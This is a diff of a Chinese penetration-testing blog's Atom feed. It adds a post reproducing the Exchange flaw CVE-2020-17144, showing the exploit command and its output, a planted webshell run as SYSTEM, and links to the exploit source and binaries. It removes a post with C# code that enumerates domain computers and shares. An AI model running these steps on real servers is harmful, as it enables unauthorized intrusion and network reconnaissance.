@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2020-11-30T11:29:20.744Z</updated>
+  <updated>2020-12-09T17:22:44.686Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -15,6 +15,35 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2020-17144 Exchange远程代码执行漏洞复现</title>
+    <link href="http://k8gege.org/p/CVE-2020-17144.html"/>
+    <id>http://k8gege.org/p/CVE-2020-17144.html</id>
+    <published>2020-12-09T16:50:00.000Z</published>
+    <updated>2020-12-09T17:22:44.686Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>漏洞是由程序未正确校验cmdlet参数引起。经过身份验证的攻击者利用该漏洞可实现远程代码执行。</p><p>该漏洞和 CVE-2020-0688 类似，也需要登录后才能利用，不过在利用时无需明文密码，只要具备 NTHash 即可。除了常规邮件服务与 OWA外，EWS接口也提供了利用所需的方法。漏洞的功能点本身还具备持久化功能。</p><p>参考 <a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17144" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17144</a></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 31</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>C:\Users\k8gege&gt;CVE-2020-17144.exe 192.168.1.89 administrator K8gege520<br>BinaryFormatter<br>[+] Target: <a href="https://192.168.1.89/ews/Exchange.asmx" target="_blank" rel="noopener">https://192.168.1.89/ews/Exchange.asmx</a><br>[+] User: administrator K8gege520<br>[+] Shell in <a href="https://192.168.1.89/autodiscover/Services.aspx" target="_blank" rel="noopener">https://192.168.1.89/autodiscover/Services.aspx</a>, Wait for few minutes</p><h3 id="连接webshell"><a href="#连接webshell" class="headerlink" title="连接webshell"></a>连接webshell</h3><p>C:\Users\k8gege&gt;Ladon WebShell aspx cd <a href="https://192.168.1.89/autodiscover/Services.aspx" target="_blank" rel="noopener">https://192.168.1.89/autodiscover/Services.aspx</a> Ladon whoami</p><p>Load WebShellExec</p><p>nt authority\system</p><p><img alt="image" data-original="http://k8gege.org/k8img/posts/CVE-2020-17114.png"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>Src: <a href="https://github.com/Airboi/CVE-2020-17144-EXP" target="_blank" rel="noopener">https://github.com/Airboi/CVE-2020-17144-EXP</a><br>Bin: <a href="https://github.com/k8gege/K8tools" target="_blank" rel="noopener">https://github.com/k8gege/K8tools</a> 编译好的</p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h3&gt;&lt;p&gt;漏洞是由程序未正确校验cmdlet参数引起。经过身份验证的攻击者利用该漏洞可实现远程代码执行。&lt;/p&gt;
+&lt;p&gt;该漏洞和 CV
+      
+    
+    </summary>
+    
+    
+      <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
+    
+    
+      <category term="CVE-2020-17144" scheme="http://k8gege.org/tags/CVE-2020-17144/"/>
+    
+      <category term="Exchange" scheme="http://k8gege.org/tags/Exchange/"/>
+    
+  </entry>
   
   <entry>
     <title>LadonGo开源全平台渗透扫描器框架</title>
@@ -159,9 +188,9 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
     </summary>
     
     
-      <category term="工具" scheme="http://k8gege.org/categories/Tool/"/>
-    
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+      <category term="工具" scheme="http://k8gege.org/categories/Tool/"/>
     
     
       <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
@@ -571,9 +600,9 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
     </summary>
     
     
-      <category term="工具" scheme="http://k8gege.org/categories/Tool/"/>
-    
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+      <category term="工具" scheme="http://k8gege.org/categories/Tool/"/>
     
       <category term="密码" scheme="http://k8gege.org/categories/Pass/"/>
     
@@ -593,46 +622,6 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
       <category term="IIS" scheme="http://k8gege.org/tags/IIS/"/>
     
       <category term="LDAP" scheme="http://k8gege.org/tags/LDAP/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>利用DirectoryEntry获取域内计算机以及共享资源</title>
-    <link href="http://k8gege.org/p/54132.html"/>
-    <id>http://k8gege.org/p/54132.html</id>
-    <published>2020-06-06T02:30:10.000Z</published>
-    <updated>2020-10-13T14:01:07.394Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>System.DirectoryServices.DirectoryEntry组件提供了对Active Directory的访问。本文以两个简单的小程序为例，阐述了如何利用此组件查看网络的各节点的信息。 DirectoryEntry组件提供了Path属性，根据文档，此属性指定了目录服务中用来访问对象的对象名，其格式如下：<br>protocol://servername:port number/distinguished name<br>此语句的第一部分定义了访问将使用的协议，如<br>LDAP: (Lightweight Directory Access Protocol)<br>IIS: (提供IIS元数据来读及配置Internet Infomation Server)<br>WinNT: (提供在非常有限的性能下对Windows NT域的访问)<br>NDS: (提供对Novell Directory Service的访问)<br>等等（详细信息清参考MSDN）。 </p><p>因此我们构造一个DirectoryEntry实例，将它的Path设为”WinNT:”，以通过对它的所有子项的枚举来发现网络上的所有域（以及工作组）。这样，再对所发现的域（以及工作组）的子项进行枚举，就可以发现网络上的所有计算机，结合WMI发现机器上的共享资源。</p><h3 id="C-实现代码"><a href="#C-实现代码" class="headerlink" title="C#实现代码"></a>C#实现代码</h3><p>以下为Ladon的EnumShare代码,自动获取当前域，并枚举域内计算机以及获取机器开放共享资源。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">string strDomain;</span><br><span class="line">string strComputer;</span><br><span class="line">string strShare;</span><br><span class="line">Console.WriteLine(&quot;Load EnumShare&quot;);</span><br><span class="line"></span><br><span class="line">DirectoryEntry root &#x3D; new DirectoryEntry(&quot;WinNT:&quot;);</span><br><span class="line">foreach (DirectoryEntry Domain in root.Children)</span><br><span class="line">&#123;</span><br><span class="line">    strDomain &#x3D; Domain.Name;</span><br><span class="line">    Console.WriteLine(&quot;Domain: &quot; + strDomain);</span><br><span class="line">    foreach (DirectoryEntry Computer in Domain.Children)</span><br><span class="line">    &#123;</span><br><span class="line">        if (Computer.SchemaClassName.Equals(&quot;Computer&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            strComputer &#x3D; Computer.Name;</span><br><span class="line">            ManagementObjectSearcher searcher &#x3D; new ManagementObjectSearcher(&quot;select * from win32_share&quot;);</span><br><span class="line">            foreach (ManagementObject share in searcher.Get())</span><br><span class="line">            &#123;</span><br><span class="line">                strShare &#x3D; share[&quot;Name&quot;].ToString();</span><br><span class="line">                Console.WriteLine(strComputer + &quot;\\&quot; + strShare);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ladon EnumShare<br>因为崇尚极简主义，所以Ladon无需填写域名以及参数，参数多也很烦，全自动获取，一步到位。<br><img alt="img" data-original="https://k8gege.org/k8img/Ladon/exe/EnumShare.PNG"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p><p><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.directoryservices.directoryentry?view=netframework-4.8" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/api/system.directoryservices.directoryentry?view=netframework-4.8</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;System.DirectoryServices.DirectoryEntry组件提供了对Active Directory的访问。本文以两个
-      
-    
-    </summary>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-      <category term=".NET" scheme="http://k8gege.org/categories/Dotnet/"/>
-    
-      <category term="主机发现" scheme="http://k8gege.org/categories/OnlinePC/"/>
-    
-      <category term="源码" scheme="http://k8gege.org/categories/Code/"/>
-    
-      <category term="内网渗透" scheme="http://k8gege.org/categories/Lan-Pentest/"/>
-    
-      <category term="信息收集" scheme="http://k8gege.org/categories/Discover/"/>
-    
-      <category term="编程" scheme="http://k8gege.org/categories/Program/"/>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
-      <category term=".NET" scheme="http://k8gege.org/tags/Dotnet/"/>
     
   </entry>
   
